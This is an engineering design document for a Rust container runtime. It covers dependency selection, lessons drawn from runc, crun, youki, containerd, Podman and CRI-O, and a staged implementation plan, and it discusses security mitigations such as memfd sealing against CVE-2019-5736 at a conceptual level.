**`crates/cli` — the transient front end.**

| Crate | Version floor | What it is for | If it disappeared |
|---|---|---|---|
| `clap` | **4.6**, `default-features = false, features = ["std","derive","help","usage","error-context","suggestions"]` | argument parsing | ~300 lines of hand-rolled parsing |
| `anyhow` | **1.0.103** | the boundary where the only job left is printing — in a separate crate so `core` cannot reach it | `Box<dyn Error>` |
| `pentacle` | **1.1** | `ensure_sealed()` as the first statement of `main()`: the `/proc/self/exe` memfd self-copy defence | ~60 lines of `memfd_create` + `F_SEAL_*` + re-exec — or `memfd 0.6.6`, whose only dependency is `rustix`, so it is free in graph terms |
| `tracing-subscriber` | **0.3.23** | the CLI's log sink, with ANSI sanitisation kept on | a `writeln!` to stderr |

**`crates/extract` — layer extraction. Synchronous, no runtime, input is `impl std::io::Read`.**

| Crate | Version floor | What it is for | If it disappeared |
|---|---|---|---|
| `tar` | **0.4.45** | ustar/PAX/GNU **header parsing only** — never `unpack`/`unpack_in` | ~400 lines of octal fields, checksums, PAX records and sparse maps |
| `flate2` | **1.1** (pure-Rust backend) | gzip | not worth considering |
| `zstd` | **0.14** | zstd decompression; `ruzstd` if the vendored C becomes a build problem | not worth considering |
| `sha2` | **0.11** | digest verification; **sets the project MSRV at 1.88** (§15.7.2) | not worth considering |

**`crates/pull` — the registry client. May be a separate process; see §15.6.2.**

| Crate | Version floor | What it is for |
|---|---|---|
| `ureq` | **3.5** | synchronous HTTP + TLS, with content-decoding **off** |
| *or* `reqwest` + `tokio` | 0.13.5 / **1.54.1** | only if HTTP/2 multiplexing or pooling proves necessary; then this crate is a separate **process** |
| transitively | `rustls >= 0.23.46`, `rustls-webpki >= 0.103.16`, `webpki-roots >= 1.0.10` | §15.7.1 |

**Not taken, with the replacement and what we gain**

| Not taking | Instead | Lines | What we gain |
|---|---|---|---|
| `nix` | `rustix` + §15.2's seven `libc` calls | 0 | one syscall layer instead of two; and `rustix`'s `set_thread_*` is the raw-syscall identity drop, which `nix` is not (§15.1.1) |
| a published container runtime library | the runtime itself | the project | it *is* the runtime; depending on it makes this a CLI wrapper, which the charter rules out. Read it; do not link it |
| `cgroups-rs` / any cgroup library | `mkdir` + `openat`-relative `write` | ~300 | cgroup v2 is a dozen files; and `cgroups-rs` would put a thread pool in the process that calls `clone3` (§15.5.4) |
| `caps` | `rustix::thread::*` + a ~41-line name↔bit `match` in the parent | ~41 | allocation-free and `errno`-free in the child; one `capset` instead of six syscalls (§15.5.1) |
| `libseccomp` | `seccompiler` | 0 | no C on the link line; static musl stays free (§15.7.3) |
| `nc` | `libc::syscall(SYS_clone3, …)` + one `#[repr(C)] clone_args` | ~15 | the most important `unsafe` call in the project is ours, read line by line, with the two trap comments on it (§15.2) |
| `rtnetlink` | `netlink-sys` + the packet crates + our socket loop | ~200 | no executor, no `nix`, and the sequencing and error mapping stay ours |
| `nftnl` | the firewall trait, backend an open decision (§15.5.5) | — | no C FFI, no generated `unsafe` |
| `sendfd` / `passfd` | `rustix::net::{sendmsg, recvmsg}` + `cmsg_space!` | ~40 | `OwnedFd` end to end, so a received pty master has exactly the owners we intend |
| `signal-hook` | `signalfd` (5 lines of `libc`) or pidfd + `epoll` | ~15 | we structurally avoid signal handlers; this crate exists to make handlers safe |
| `procfs` | parse `/proc/<pid>/stat` field 22 | ~10 | no `chrono` and no `flate2` for one integer. Split after the **last** `)` |
| `pathrs` / `safe-path` | `rustix::fs::openat2` + `ResolveFlags` | 0 | the kernel resolving paths safely beats any userspace reimplementation |
| `close_fds` / `command-fds` | `libc::syscall(libc::SYS_close_range, …)` | 1 | §15.2 |
| `scopeguard` | a named guard with `.commit()` | ~20 | the guard and the inspectable rollback list share one `Cleanup` enum |
| `tokio` in `core` | a synchronous `epoll` loop | ~80 | the one invariant the whole runtime design rests on (§15.6.1) |

**Two operational notes on the set.**

- **`seccompiler` compiles parent-side; consider installing the filter ourselves.** The compile step
  allocates a `Vec<sock_filter>`, which is legal in the parent and forbidden in the child. Doing the
  install — one `syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER, flags, &sock_fprog)` over the
  pre-built program — ourselves keeps the child's third-party code surface at **zero** and costs one
  line, the same line §15.2 already prices.
- **Pin exactly, not by caret range**, for `rustix`, `libc`, `oci-spec` and `seccompiler`: three have
  a documented reason (rustix's `not_implemented.rs` boundary moves, `libc`'s `CLONE_INTO_CGROUP` is
  broken on the 0.2.x line, `oci-spec`'s own version constants disagree with each other), and the
  fourth has an archived repository link that will mislead a future audit.

---

### What this decides

**Decide before any code is written.** Each of these shapes function signatures, crate boundaries or
build configuration, and retrofitting means touching every call site.

| Decision | Why it cannot wait |
|---|---|
| **`rustix` is the single syscall layer; no `nix`; a seven-call raw `libc` surface beside it** | every call site names one of these — and `rustix::thread::set_thread_*` being the raw-syscall identity drop is why the child is safe at all (§15.1.1) |
| **All `rustix` imports go behind one internal `crate::sys::` module** | ~60 lines now; the difference between a mechanical migration and an architectural one if the bus factor ever cashes in (§15.1.5) |
| **Two crates, `core` and `cli`, with `cargo tree -i tokio` as a CI step** | "no async runtime near `clone3`" must be a build failure, not a review rule — a current-thread runtime does not save you, `tokio::fs::read` breaks it (§15.6.1) |
| **Kernel constants above bit 31 are defined by us, and `#![deny(deprecated)]` in `core`** | `libc::CLONE_INTO_CGROUP` truncates to **zero** on glibc and does not exist on musl: `clone3` succeeds, returns no error, and the child lands in the wrong cgroup (§15.3) |
| **Every path the child touches is a pre-built `CString` in one struct built parent-side** | this is a *type signature* decision: `rustix`'s path argument heap-allocates at ≥ 256 bytes, in the window where allocation can deadlock forever (§15.4.3) |
| **Target `x86_64-unknown-linux-musl`, static, on stable** | free *only* if no crate in `core` pulls a C library, which constrains the seccomp choice and every later dependency (§15.7.3) |
| **The firewall backend: own the nftables encoding, or drive `nft(8)`** | genuinely open, with real arguments both ways, and it determines whether an external binary becomes a runtime dependency. Decide it **behind a trait** so it stays reversible (§15.5.5) |

**Can wait, safely.**

| Decision | Until |
|---|---|
| multi-architecture seccomp profiles — accept single-arch, emit the dispatch ourselves, or take `libseccomp` | OCI-compatibility work; phase 1 accepts single-arch and documents it (§15.5.2) |
| `ureq` + threads versus `reqwest` + `tokio` in a separate process | the pull path is designed; keep the separate-process rule either way (§15.6.2) |
| `memfd` in-tree versus `pentacle` | whenever — `memfd`'s only dependency is `rustix`, so the graph cost is zero either way |
| `procfs` with `default-features = false` | the second `/proc` file we need |
| `scopeguard` | when the hand-rolled guard grows a second axis |
| `rustables` as the pure-Rust firewall end state | behind the trait, if it matures |
| raising the MSRV above 1.85 | when `sha2 0.11` actually lands in the workspace (§15.7.2) |

**Open, and named so it is not mistaken for settled.**

- **"No `rustix` function in our child subset allocates"** is verified exhaustively for the
  path-argument surface and spot-checked elsewhere, but not proven across all ~40 function bodies.
  Settle it with §15.4.4's `#[global_allocator]` counting test — **with a ≥ 256-byte rootfs path**,
  or it proves nothing.
- **Four kernel- and crate-behaviour claims here are read from source and not run:** `clone3`
  rejecting the exit signal in the flags word; `CLONE_INTO_CGROUP` requiring `usize >= 88`; the
  behavioural consequence of the truncated constant; and the `Mutex<File>` log-sink deadlock. Each
  has its exact test named in place (§15.2, §15.3, §15.6.3). They are cheap, they need only a dev
  VM, and the identity-drop check should be run first.

---

---

## 16. Reference implementation lessons

**The one sentence worth carrying from all six projects: almost every mechanism above the
fork/exec/namespace/cgroup layer exists to solve "my supervisor is not my client's parent."**
conmon's subreaper, youki's `as_sibling` option, runc's `CLONE_PARENT`, and containerd's shim
`delete` subcommand are four different solutions to the same self-inflicted problem. A design
in which the supervisor *is* the container's parent does not have that problem and needs none
of those four solutions — but it pays a different, explicit price: a supervisor process, a log
writer, a state file, and eventually an attach socket. That price buys detached containers and
a durable exit code, and nothing else on the list is forced by it.

Each lesson below states the mechanism, the problem it solves, and whether that problem is
ours. Several of these structures exist for reasons that genuinely do not apply to a
single-binary, single-threaded, non-Kubernetes engine.

### 16.1 runc

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| `runc init` — a re-exec of self **to enter namespaces**; `nsexec.c` from a C constructor; `setjmp`/`longjmp` staging; a netlink-TLV bootstrap encoding on a socketpair | Go's runtime is multithreaded from the first instruction, and the kernel rejects `unshare(CLONE_NEWUSER)`, `setns(CLONE_NEWUSER)` and `setns(CLONE_NEWNS)` outright from a multithreaded process | **No.** The entire mechanism is scaffolding for a language constraint we do not have. Deleting it is the single largest simplification available. |
| **Sealing `/proc/self/exe` into a memfd before `main`** (`cloned_binary.c`) | CVE-2019-5736: a container obtains a handle to the runtime binary through `/proc/<pid>/exe` and overwrites it, so the **next** invocation runs attacker code | **Yes, unconditionally.** Not avoidable by declining to re-exec — see §6.4. crun and youki both ship the same mitigation in their own languages. |
| `exec.fifo` as the create/start rendezvous, with the fd passed to init as `O_PATH` | the init must park between `create` and `start`; a blocking `open(O_WRONLY)` in the parent would block the parent, and `O_PATH` gets a reference without opening | **Yes.** Introduced 2016-06-13 (`opencontainers/runc@3aacff695db6`, *"Use fifo for create/start"*) to replace a `SIGCONT` rendezvous — it predates every shim protocol and is spec-driven, not shim-driven. |
| **Recording `external_descriptors`** — what fds 0/1/2 pointed at **at create time** — into the state file | the container may replace its own fds; what they originally referred to is unrecoverable afterwards, and `exec` needs it to default a new process's stdio | **Yes, and a naive implementation skips it** because nothing needs it until `exec` exists, by which time the information is gone. |
| **Reading the cgroup's OOM counter before reporting a creation failure**, annotating the error as "container init was OOM-killed" | "container creation failed" with no reason is the most common unhelpful container error | **Yes.** Nearly free; turns a mystery into a diagnosis. |
| `defer`-based reverse unwind with a `--keep` escape hatch, and a failed `create` routed to the runtime's own `destroy()` | a creation sequence is ~15 privileged operations each of which can fail, most mutating global kernel state | **Yes** for the structure — one teardown path shared by failed-create and `delete`. The `--keep` hatch is useful and not structural. |
| **State root `0700`, per-container dir `0711`, `state.json` `0600`, `exec.fifo` `0622`** | the FIFO must be world-writable so a container init running as an unprivileged uid can open it; the `0700` root is the only thing preventing any local user who learns an id from starting a created container | **Yes, and the `0700` root is the part that gets skipped**, because the other three modes look like the whole story. |
| `/proc/<pid>/stat` field-22 start-time comparison as a PID-reuse guard | a recycled pid makes a dead container look alive, and `kill` then hits a stranger | **Partly.** While a supervisor lives, a pidfd is strictly better. Keep the start-time check only for the after-the-supervisor-died case. |
| **No exit code on disk** (`runc state` reports `stopped` and nothing else) | — | **This is the gap, not the lesson.** It is the single reason a supervisor must exist above runc, and fixing it is our main addition. |
| Stat-then-`mkdir` for container-id uniqueness; an in-process mutex and no file lock anywhere | runc relies on containerd guaranteeing one writer per container | **No — and this is the layer we deleted, so the locking becomes ours.** Use `mkdir` alone (atomic, `EEXIST`) and a real `flock`. |
| A dynamically-linked runtime binary | — | **No.** A dynamically-linked runtime bind-mounted into a container needs the container's loader. Static-link ours. |

### 16.2 crun

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| **A fixed-size `#[repr(C)]`-shaped error record written with a single `write()`** — `struct sync_socket_message_s { int type; int error_value; char message[512]; }` — plus redirecting the entire logging output handler into that socket while in the child | a child between `clone()` and `execve()` cannot allocate, so a formatted error, an owned `String` or a serializer are all unavailable; without this the parent's only information is "child exited 1" | **Yes.** It is the only design that reports a real error from a post-fork failure. Independently arrived at by runc (a sync socket plus a separate log pipe) and conmon (an always-present stderr pipe). |
| **The child reads its own host pid from the sync socket as its first act** | once inside a PID namespace, `getpid()` returns 1 and `/proc/self` reports the namespace-local pid, so the child cannot discover its host pid | **Yes, the moment the child needs to name itself** — a cgroup write, an error message, a `/proc/<hostpid>/…` path the parent will use. Easy to miss until it produces nonsense pids in logs. |
| **`clone()` before any `setns()`/`unshare()`** — *"a `clone()` is required to not touch the caller context that can be used later on for running hooks"* | `unshare` is irreversible for the caller; a supervisor that unshares in place loses the host namespace context it needs for `createRuntime`/`poststop` hooks and host-side teardown | **Yes, as a rule: never `unshare()` in the supervisor, always `clone()` with the flags.** This is a single-threaded C program explaining why it forks anyway — i.e. the fork is not a language workaround. |
| `clone3` with `CLONE_INTO_CGROUP` and a `clone()` fallback | the child's own children escape the cgroup for a window if the cgroup is applied after the fork | **Yes** for `CLONE_INTO_CGROUP`. **No** for the fallback, if the kernel floor is declared ≥ 5.7. |
| **A failed `create` implemented literally as a forced `delete`** | the two paths undo the same resources | **Yes, structurally.** Two implementations will diverge, and the divergence will be a leak. |
| `__attribute__((constructor))` for memfd sealing | CVE-2019-5736 | **Yes** (16.1). Note that crun's constructor is for *sealing*, not for namespace entry — the two are routinely conflated. |
| No persisted rollback journal; teardown re-derived from the status file plus the config | — | **Yes, by omission.** Nothing in the ecosystem persists an acquisition list; the verbatim `config.json` copy is what makes re-derivation possible. |

### 16.3 youki

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| **No re-exec at all for namespace entry**; container setup runs in the cloned child's own address space | Rust has no mandatory runtime to pre-empt | **Yes — this is the proof the simplification is real and shipped**, not theoretical. |
| Typed unidirectional channels over socketpairs replacing runc's netlink TLV, carrying the same protocol shape (`identifier_mapping_request` / `mapping_written`, `InitReady`) | the kernel constraints are identical regardless of language; only the encoding was a C↔Go artefact | **Yes.** Same language both sides means a struct, not a wire format. |
| **An intermediate process, kept even though Rust does not force one** | the userns map-writing dance needs a process that unshares the userns while a privileged process outside writes its maps; `CLONE_NEWPID` needs a fork | **Only when rootless lands.** Root-first, a two-process shape holds — the supervisor writes the maps directly and is init's parent. Structure the create path so the map-writer is a named participant now. |
| **`CLONE_PARENT` on the intermediate→init clone, unconditionally** | init's parent stays the top-level process, so nothing ever depends on reparenting | **Yes, the day an intermediate exists.** `CLONE_PARENT` is deterministic; subreaping is a fallback. Two kernel constraints: `EINVAL` from a process with `SIGNAL_UNKILLABLE` (a namespace init cannot create siblings), and `clone3` rejects it with a non-zero `exit_signal`. |
| `as_sibling` (default **false**), which moves the *intermediate*'s parent, not init's | an embedder whose own `create` process exits wants the container owned by *its* caller rather than reparented to PID 1 | **No.** Our supervisor stays alive and is the parent, so the motivation does not exist. Carry only the `CLONE_PARENT` mechanism forward. |
| `clone3` as a raw syscall first, `libc::clone` with an `mmap`'d stack and a guard page as fallback — and an explicit refusal to use the obvious wrapper because *"the wrapper implementation fails to pass the right ownership to the new child process"* | a stack collision in the fallback is memory corruption presenting as random child crashes | **The warning is ours; the fallback need not be.** Declare the kernel floor and use `clone3` only. |
| `pentacle::ensure_sealed()` as the first statement of `main()`, before argument parsing | CVE-2019-5736 | **Yes** (16.1). Note what this means methodologically: the mitigation is in the *binary* crate, not the library crate, so a grep of the library tree finds nothing — **"youki does not do it" was a false negative.** Do not assume a security mitigation is absent because it is not where you looked. |
| No async anywhere in the container-creation crate, despite the workspace depending on a multi-threaded runtime elsewhere | the fork-safety constraint in §7.4 | **Yes.** The most mature Rust OCI runtime draws the sync/async boundary exactly where §7.4 draws it. |

### 16.4 containerd and Docker

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| **The supervisor is kept out of the supervised cgroup** (**Observation**: the shim is in `/system.slice/containerd.service` while the container is in `/system.slice/docker-<id>.scope`) | if the supervisor is in the container's cgroup, the OOM killer will eventually choose it — and then the exit status of the thing being supervised is lost | **Yes.** A supervisor inside the supervised cgroup is a design bug. conmon reaches the same conclusion from the other direction by writing `-1000` to its own `oom_score_adj`. |
| **Holding both ends of every stdio FIFO** (**Observation**: shim fds 12/14/15/16 include both a read and a write handle on the same path) | a FIFO with zero readers or zero writers returns EOF or `EPIPE` to the other side; a container whose log reader restarts would otherwise get `SIGPIPE` and die | **Yes, and it is the most-copied trick in the fd table and the easiest to miss.** |
| Reconnecting to a supervisor by reading an `address` file from the bundle and dialling it | after a restart, the manager must find supervisors it did not spawn, without walking the process tree | **No**, because we have no manager to restart. The underlying idea — *the filesystem, not a process tree, is how you re-find things* — is ours and is already how `ps` works. |
| A full ttrpc `Task` service per shim, with spec-mandated event ordering (`TaskCreate` → `TaskStart` → `TaskExit` → `TaskDelete`) and a mandatory `delete` subcommand for orphan recovery | a long-lived daemon needs live, typed, ordered state from supervisors it did not spawn, and a way to clean up after a supervisor it can no longer reach | **No.** Every requirement in that sentence presupposes a daemon. Files plus pipes are cheaper and sufficient for one machine; the cost is that the CLI reconciles on each invocation rather than receiving push notifications, which at single-machine scale is a few reads. |
| containerd `namespaces` (`moby`, `k8s.io`, `default`) | multi-tenancy: independent consumers share one containerd without seeing each other's containers. **Convention.** containerd documents them as *"an administrative construct that is not meant to be used as a security feature."* | **No.** Pure multi-tenancy. |
| A plugin architecture where every subsystem is `<type>.<id>` | third-party extensibility, which is a project-governance requirement | **No.** An interface with one implementation is not architecture. We will have exactly one snapshotter, one runtime, one content store. Write the concrete thing; extract a trait the day there is a second implementation. |
| A BoltDB metadata store | a daemon needs an indexed, transactional view over many objects | **No** — and note the mechanism by which this choice propagates: BoltDB takes an `flock` and is single-writer, so **exactly one containerd can own the file. The database is what makes containerd a daemon whether it wants to be or not.** |
| Two logging hops — container → shim pipes → named FIFOs → dockerd → json file | dockerd must be able to restart and re-open the stream by path, which a pipe cannot do | **No.** The hop exists only because the writer and reader are different daemons. With one supervisor doing both, it is pure cost whose failure mode is a container stalling after 64 KiB of unread output. |
| `docker-proxy`, one userspace forwarder per published port, with `Pdeathsig = SIGTERM` and the pre-bound listening socket handed over as an extra fd | what DNAT alone misses: host-loopback to a published port, IPv6 gaps, and holding the port reserved | **Probably not**, with root plus netns plus veth plus nftables DNAT. Add it only if host-loopback to a published port actually fails and we care. |
| An unbounded json log file by default (**Observation**: 27,498,753 bytes for one nginx container over 11 days with no rotation configured) | — | **This is the anti-lesson.** Our supervisor owns rotation, so it must cap from day one; the cap is about twenty lines and its absence is a disk-full outage. |

### 16.5 Podman and conmon

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| **A start-pipe handshake: the supervisor blocks on a read before spawning anything, so the caller can place it in the right cgroup first** (*"Block for an initial write to the start pipe before spawning any children or exiting, to ensure the parent can put us in the right cgroup"*) | the supervisor must be in a known cgroup before it forks, and the *caller* is the party that knows the cgroup policy | **Yes, the day the supervisor goes into a cgroup of its own.** Strictly better than the supervisor placing itself. |
| **A stderr pipe is created unconditionally, even in TTY mode** — *"because that way we can capture runc stderr messages before the tty is created"* | the hardest failure to debug is a runtime that failed before it had anywhere to write | **Yes.** |
| The control FIFO is opened on **both** ends — *"to prevent getting flood of POLLHUPs when last writer closes"* — with the read half `O_RDONLY\|O_NONBLOCK\|O_CLOEXEC` **first**, then the write half | per `fifo(7)`, that is the only ordering that cannot block | **Yes**, including the ordering, which is not decoration. |
| `SOCK_SEQPACKET` socketpairs for the sync and start pipes, and a **1-byte stream tag** for attach framing | SEQPACKET preserves message boundaries, so no length prefix is needed — which is why Docker's 8-byte framed stream exists for stream sockets and conmon's does not | **Yes**, with one cost to write down: SEQPACKET has a maximum datagram size, so an attach implementation must chunk. |
| The `sun_path` 108-byte workaround: open the parent directory `O_PATH` and bind relative to it through `/proc/self/fd`, with a symlink-shortening fallback | `sockaddr_un.sun_path` is 108 bytes including the NUL, and per-container socket paths with long ids overrun it | **The problem is ours; this solution is the expensive one.** Put runtime sockets under a short `/run/mydocker/<12-hex>/` path instead. |
| **Turning off the subreaper flag before double-forking the exit command** — *"that would prevent double-fork from doing its job"* | a subreaper adopts everything, including processes you deliberately want orphaned | **Yes, as a principle: a subreaper is a mode you enter and leave, not a flag you set once.** |
| Teardown order: read the OOM counter → drain stdio → flush logs → compute status → **close host resources** → write the exit record | closing injected port-reservation fds *after* announcing the exit leaves a window in which a racing `run -p` on the same port fails; flushing after declaring exit loses the container's last output | **Yes, all of it**, and the ordering is load-bearing in both places. |
| **Two exit records: one per-container file and one entry in a shared flat directory** — *"helps if a daemon process wants to monitor all container exits using inotify"* | a watcher otherwise has to watch N directories | **Yes, and it is free.** If we ever build `events`, that directory *is* the exit event stream. |
| `--exit-command`, which conmon forks on the way out to run `podman container cleanup` | the supervisor cannot do teardown that requires the manager's own state (netns, DB records, mounts the manager made) | **No.** Our supervisor owns the teardown directly because there is no separate manager holding half of it. |
| Reboot detection via an `alive` file in a tmpfs directory | distinguishing "nothing is running because we rebooted" from "nothing is running" | **The problem is ours; this solution is a proxy.** The boot id answers the actual question and works even if state lives on persistent disk. |
| Flattening "killed by signal N" into `128 + N` | one integer carries both cases | **No.** Keep `exit_code: Option<i32>` plus separate `signal` and `oom_killed`; the type system makes the distinction free. |
| `podman system service` — an API socket that is **not** the container's parent | adding an API without reintroducing a daemon in the supervision path | **Yes, as the model if we ever want an API: a protocol adapter, not a supervisor.** |

### 16.6 CRI-O

| Mechanism | Problem it solves | Ours? |
|---|---|---|
| **No metadata database. One atomically-written `state.json` per container, and on restart an in-memory index rebuilt by walking the container directories** | durable container state without a store that must be opened, locked, migrated and repaired | **Yes — and this is the single strongest piece of evidence in the whole comparison.** CRI-O runs production Kubernetes nodes with hundreds of containers this way. Anyone arguing a single-machine engine needs a key-value store is importing containerd's multi-tenant requirements. |
| **Restoring volumes and ID mappings from the copied OCI spec itself**, not from a separate record | the bundle may be gone, and a second record can disagree with the first | **Yes.** Keep a verbatim `config.json` copy beside the state file; it is what makes `delete --force` derivable and a rollback journal unnecessary. |
| Bounded scope: CRI only, explicitly excluding image build, sign and push; its own CLIs *"only meant for testing"* | a component that refuses features does not grow a plugin system, a client API or a metadata DB | **Yes, as a discipline.** Bounded scope is why CRI-O can refuse the machinery containerd must carry. |
| The CRI surface itself — pod sandboxes, the pause container, CNI, shim grouping by sandbox id, kubelet version-skew tracking | serving a Kubernetes node | **No.** None of it exists outside Kubernetes. |

### 16.7 The three buckets

**Ours, because the kernel or the spec forces it.** The fork to become PID 1 of a new PID
namespace (`CLONE_NEWPID` affects children only, in every language); a privileged process
outside the userns to write `uid_map`/`gid_map` the day rootless lands; a `create`/`start`
rendezvous and an observable, signallable `created` state (four spec clauses, only one about
hooks); a typed child→parent sync and error channel that allocates nothing; `pivot_root` with
mount ordering; cgroup v2 done properly — `clone3(CLONE_INTO_CGROUP)`, `cgroup.kill`,
`memory.events`; and the memfd self-clone against CVE-2019-5736, unconditionally and not
contingent on bind-mounting any host path.

**Ours only if we want a specific feature, and priced accordingly.** A supervisor at all —
only for `-d`. pty handling — only for `-t`. An attach socket — only for `-d` *and* `-t`. A
log writer and an exit-status file — only for `-d`. `PR_SET_CHILD_SUBREAPER` — only for
`exec` descendants and `--pid=host`. A pidfd per container — cheap, PID-reuse-proof, and on
kernel ≥ 6.15 a second exit-code source. Port publishing without a userspace proxy — only if
host-loopback to a published port matters.

**Not ours. This is where the cargo-culting lives.** A metadata database; containerd
namespaces; a plugin architecture; a shim RPC API with mandated event ordering and a `delete`
subcommand for orphan recovery; the CRI surface and everything under it; the entire rootless
support stack (`newuidmap`/`newgidmap`, subuid allocation, userspace network stacks,
`fuse-overlayfs`, cgroup-delegation detection) that root-first lets us skip; runc's Go
workarounds; a separate runtime binary and runtime pluggability; a persisted rollback journal;
a userspace port proxy; a setuid helper; and the sandboxed-kernel families (gVisor, Kata,
Firecracker) whose threat model is not ours — though that last one deserves an honest line in
the project's README rather than silence: **a namespace-based engine does not protect against
a hostile image.**

---

## 17. Recommended implementation progression

Eleven stages. Each one is independently testable, each introduces exactly one new
kernel-or-runtime concept, and each is small enough for a planning session to turn into one or a few
implementation features.

The first five stages deliberately prioritise **understanding the mechanism over Docker
compatibility** — there is no image, no registry and no network until the process model is
genuinely understood, because every one of those subsystems is easier to reason about once the
process model is not also in question. A reader who wants `mydocker run alpine echo hello` working
sooner should note that stage 6 is where it first runs, and that arriving there with stages 1–5
unbuilt produces a program that cannot explain its own failures.

**Two rules that apply to every stage.** First, the success test must be satisfiable with **only
that stage's work** — the original domain ladders contained two violations of this, both corrected
below. Second, every stage's test asserts its guarantee by **reading back kernel state from inside
the container**, never by observing that a command printed the right thing (§1.2).

---

### Stage 1 — A process in namespaces of its own

**Goal.** Create a child process in new namespaces and wait for it correctly. No image, no root
filesystem change, no limits. This stage exists to make the parent/child protocol and the
post-`clone` constraints concrete before anything depends on them.

**New concept.** `clone3` with namespace flags; the parent↔child synchronisation pipe; what may and
may not execute in the child between `clone` and `execve`; PID 1 semantics inside a PID namespace.

**Commands.** `mydocker run --rootfs / --network=host /bin/sh`.

**Explicitly not supported.** Images, root filesystem change, networking (the host network namespace
is shared and the flag is mandatory), cgroups, capabilities, seccomp, detach, `ps`.

**Success test.** Inside the container: `echo $$` prints `1`; a `hostname` set by the parent differs
from the host's; `readlink /proc/self/ns/pid` differs from the host's. The parent collects the
child's exit status correctly for a normal exit, a non-zero exit, and a signal death. Killing the
container's PID 1 tears down the namespace.

**Teaching moment, not a bug.** `ps` inside still lists host processes, because `/proc` has not been
remounted. Stage 2 fixes it. Observing this is the point.

**Major risks.** The child must not allocate, log, or take a lock before `execve` — a raw `clone3`
runs none of the repair work glibc's `fork()` does, so the child is *more* constrained than after a
fork, not less. Flush stdio **before** the clone. `CLONE_NEWCGROUP` must not be in the flag word
(§4.2); it is unshared in the child later.

---

### Stage 2 — A real root filesystem

**Goal.** Give the container its own filesystem view, from a directory tree unpacked by hand. This
is the mount-namespace stage and it is where host damage first becomes possible.

**New concept.** Mount namespace mechanics; propagation and why the new root must be made
non-propagating; `pivot_root` and its preconditions; the minimum mount set (`/proc`, `/sys`, a fresh
`tmpfs` on `/dev`, `devpts`, `/dev/shm`).

**Commands.** `mydocker run --rootfs <dir> /bin/sh`, against an alpine rootfs tarball extracted
manually with `tar`.

**Explicitly not supported.** Image pulling, layers, overlay, networking, limits, security controls.

**Success test.** Inside: `ps aux` shows only container processes; `/proc/self/mountinfo` lists our
mount set and nothing else; the old root is gone. On the host, after the container exits:
`/proc/self/mountinfo` is byte-identical to before it started, and nothing remains under the
container's directory. Run the container twice concurrently and confirm neither sees the other's
mounts.

**Major risks.** Mounts leaking permanently to the host — the real exposure is a volume bind
inheriting the source's peer group, so get the propagation right before volumes exist rather than
after. `pivot_root`'s preconditions are numerous and its failures are specific; the old-root
directory descriptors must be closed explicitly rather than trusted to `MNT_DETACH`, which is the
CVE-2024-21626 class. `/proc` must be mounted by the child, after the PID namespace is entered and
before the pivot.

---

### Stage 3 — Lifecycle, supervision and state

**Goal.** The process topology everything else depends on, and the first point at which the engine
has to tell the truth about something it cannot directly observe.

**New concept.** Fork a supervisor that outlives the CLI; the `create`/`start` rendezvous; the state
directory with its lock; exit-status collection; signal forwarding; the stop grace period.

**Commands.** `run -d`, `run` (foreground), `ps`, `stop`, `rm`, `logs` (dump, not follow).

**Explicitly not supported.** `attach`, `exec`, `-it` and pty handling, restart policies, `events`,
a daemon, an HTTP API.

**Success test.** `run -d` returns and the CLI process is gone while the container still runs; `ps`
reports it. `stop` records exit code 143 and the container is gone from `ps`. Two concurrent `run`
invocations do not corrupt the state directory. **The honesty tests:** `kill -9` the supervisor and
confirm `ps` reports the exit code as *unknown* rather than `0`; and confirm that after `run -d`
returns, a subsequent `stop` and `rm` on the same id do not block.

**Major risks.** The lock file must be `O_CLOEXEC` — `flock` releases only when every inherited
duplicate closes, so a CLI that forks a supervisor and exits has released nothing, and every later
command on that container blocks forever. `start` must not block on the rendezvous while holding the
lock, or a container whose init died wedges permanently. A container that never installed a
`SIGTERM` handler ignores it, because PID 1 inside a PID namespace has no default disposition — so
the grace period is real and `stop` must not assume signal delivery means the process is leaving.

---

### Stage 4 — Resource limits

**Goal.** Bound what the container can consume, and report accurately when a bound was hit.

**New concept.** cgroup v2's unified hierarchy; `cgroup.subtree_control` and the no-internal-process
rule; placing the child into its cgroup at clone time; `cgroup.kill`; distinguishing an OOM kill
from an ordinary signal death.

**Commands.** `--memory`, `--cpus`, `--pids-limit`. `ps` gains a reason for the exit.

**Explicitly not supported.** cgroup v1 (detect and refuse), the systemd cgroup driver, I/O limits,
cpuset, freezer as a user-facing feature.

**Success test.** Read the limit back **from inside the container** and confirm the kernel agrees
with what was asked for. `--memory=32m` plus an allocator gets killed and is reported as an **OOM**,
not as a plain signal death. `--pids-limit=16` plus a fork bomb is contained and the host stays
responsive. On a host with no writable cgroup, the engine refuses with a specific message rather
than running unlimited.

**Major risks.** The truncated clone constant (§15.3) makes race-free placement a silent no-op —
define the constant yourself and verify placement by reading `/proc/self/cgroup` from inside.
Limits are `Option<u64>` with a three-valued outcome: applied, skipped, failed. "Skipped" reported
as "applied" is the same class of lie as a `0` exit code for an unknown exit.

---

### Stage 5 — Security controls

**Goal.** Turn process isolation into something that can honestly be called a sandbox — and
understand precisely what that word now does and does not cover.

**New concept.** The five capability sets and how they transform across a uid change; `no_new_privs`
and its relationship to seccomp; a seccomp filter with a correct architecture check; masked and
read-only paths; why a fresh `tmpfs` on `/dev` is a security requirement rather than tidiness.

**Commands.** `--cap-drop` / `--cap-add`, a default seccomp profile, `--security-opt
seccomp=<file>`, `--user`.

**Explicitly not supported.** User namespaces, AppArmor and SELinux profiles, Landlock,
`--privileged`, device cgroup rules beyond the default.

**Success test.** Run as a **non-root container user** and read `/proc/self/status` from inside:
`CapBnd` is actually empty. A syscall the profile denies returns the configured errno. `/proc/kcore`
is inaccessible. `mknod` is refused. Every one of these is read from inside the container, and the
non-root user is non-negotiable — see the risk below.

**Major risks.** The capability bounding set must be dropped **while euid is still 0**. Dropping
after the uid change returns `EPERM` for a non-root user and **silently succeeds for `USER root`**,
so a test suite that only runs stock images proves nothing. A seccomp filter without a fail-closed
architecture check as its first instruction can be bypassed entirely through a different syscall
ABI. Masked paths are per-superblock and are worthless unless paired with dropping `CAP_SYS_ADMIN`
and gating `mount` — document the three as one property, because any one alone is theatre.

---

### Stage 6 — Pull and unpack a real image

**Goal.** `mydocker run alpine echo hello`, with the image fetched from a registry by our own code.
This is the first stage that produces the headline command, and it is sixth for a reason.

